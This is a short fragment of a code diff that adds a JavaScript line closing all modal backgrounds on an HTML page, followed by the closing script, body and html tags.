+      document.querySelectorAll('.modal-bg').forEach(m => m.classList.remove('active'));
+    }
   </script>
 </body>
 </html>
